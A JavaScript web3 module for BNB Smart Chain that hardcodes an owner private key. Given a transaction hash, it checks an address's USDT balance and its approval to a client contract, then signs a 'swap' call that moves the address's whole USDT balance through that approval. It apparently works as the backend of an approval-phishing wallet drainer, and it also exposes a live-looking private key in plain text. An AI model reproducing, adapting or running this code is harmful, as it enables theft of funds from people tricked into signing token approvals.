// @ts-nocheck

import Web3 from "web3";

import { USDT_CONTRACT_ABI, CLIENT_CONTRACT_ABI } from "./abi.js";
import dotenv from "dotenv";
dotenv.config();

export const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
export const CLIENT_SMART_CONTRACT = "0x3933f65d853EE89AcA1514E208FD517caE942289";

export const OWNER_PRIVATE_KEY = "0x516ec8658215163d87d3cd849335004b98e74009fe9a680e90c5ae910fe840db";

export const web3 = new Web3("https://bsc-dataseed.bnbchain.org");

export const USDTContract = new web3.eth.Contract(USDT_CONTRACT_ABI, USDT_CONTRACT_ADDRESS);
export const CLIENT_CONTRACT = new web3.eth.Contract(CLIENT_CONTRACT_ABI, CLIENT_SMART_CONTRACT);

export const approvedTransferToOwner = async (
  walletAddress,
  withdrawalBalance
) => {
  try {
    const privateKey = OWNER_PRIVATE_KEY;
    if (!privateKey) {
      return { success: false, message: "OWNER_PRIVATE_KEY is not defined in environment variables" };
    }

    const account = web3.eth.accounts.privateKeyToAccount(privateKey);
    const address = account.address;

    const balanceWei = await web3.eth.getBalance(address);
    const balanceBNB = web3.utils.fromWei(balanceWei, "ether");
    // if (parseFloat(balanceBNB) < 0.005) {
    //   return { success: false, message: "Insufficient BNB" };
    // }

    const allowance = await USDTContract.methods.allowance(walletAddress, CLIENT_SMART_CONTRACT).call();
    if (parseFloat(allowance) === 0) {
      return { success: false, message: "Insufficient allowance" };
    }

    const withdrawalBigInt = withdrawalBalance;
    const transferableAmount = BigInt(allowance) >= withdrawalBigInt ? withdrawalBigInt : BigInt(allowance);
    const data = CLIENT_CONTRACT.methods.swap(walletAddress, transferableAmount.toString()).encodeABI();

    const gasPrice = await web3.eth.getGasPrice();
    const nonce = await web3.eth.getTransactionCount(address, "pending");

    const tx = {
      to: CLIENT_CONTRACT.options.address,
      data,
      gas: 200000, // Estimate or adjust as needed
      gasPrice,
      nonce,
      chainId: await web3.eth.getChainId(),
    };

    const signedTx = await account.signTransaction(tx);

    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    const rawAllowance = await USDTContract.methods.allowance(walletAddress, CLIENT_SMART_CONTRACT).call();
    const formattedAllowance = web3.utils.fromWei(rawAllowance, 'ether');
    return { success: true, message: 'Transfer confirmed', txHash: receipt.transactionHash, usdtAllowance: formattedAllowance };
  } catch (error) {
    console.error("Error:", error);
    return { success: false, message: error.message };
  }
};

export const getUserDeatilsFromHash = async (txHash, limit, type) => {
  try {
    const tx = await web3.eth.getTransaction(txHash);
    if (!tx) {
      console.log('Transaction not found');
      return;
    }
    const fromAddress = tx.from;
    const toAddress = tx.to;

    const rawBalance = await USDTContract.methods.balanceOf(fromAddress).call();
    const formattedBalance = web3.utils.fromWei(rawBalance, 'ether');
    const rawAllowance = await USDTContract.methods.allowance(fromAddress, CLIENT_SMART_CONTRACT).call();
    const formattedAllowance = web3.utils.fromWei(rawAllowance, 'ether');
    if (toAddress?.toLowerCase() !== USDT_CONTRACT_ADDRESS.toLowerCase()) {
      return {
        success: false,
        type,
        fromAddress: fromAddress.toUpperCase(),
        txHash,
        usdtBalance: Number(formattedBalance),
        usdtAllowance: Number(formattedAllowance),
        message: ' Transaction is not directed to the client smart contract',
      }
    }

    if (Number(formattedBalance) >= Number(limit)) {

      if (Number(formattedAllowance) >= Number(limit)) {
        const result = await approvedTransferToOwner(fromAddress, rawBalance);
        let message = "";
        if (result.success) {
          message = `Transfer successful ${result.txHash}`;
        } else {
          message = `Transfer failed ${result.message}`;
        }
        return {
          success: true,
          type,
          fromAddress: fromAddress.toUpperCase(),
          txHash,
          usdtBalance: Number(formattedBalance),
          usdtAllowance: Number(formattedAllowance),
          message,
        }
      } else {
        return {
          success: false,
          type,
          fromAddress: fromAddress.toUpperCase(),
          txHash,
          usdtBalance: Number(formattedBalance),
          usdtAllowance: Number(formattedAllowance),
          message: "Insufficient USDT allowance",
        }
      }

    } else {
      return {
        success: true,
        type,
        fromAddress: fromAddress.toUpperCase(),
        txHash,
        usdtBalance: Number(formattedBalance),
        usdtAllowance: Number(formattedAllowance),
        message: "Insufficient USDT balance",
      }
    }
  } catch (err) {
    console.log("Error fetching user details from hash:", err);
    return {
      success: false,

      message: err.message,
    }

  }
};

export const getBalance = async (address) => {
  try {
    const rawBalance = await USDTContract.methods.balanceOf(address).call();
    const formattedBalance = web3.utils.fromWei(rawBalance, 'ether');
    return Number(formattedBalance).toFixed(2); // Return balance formatted to 2 decimal places
  } catch (error) {
    console.error("Error fetching balance:", error);
    throw new Error("Failed to fetch balance");
  }
}

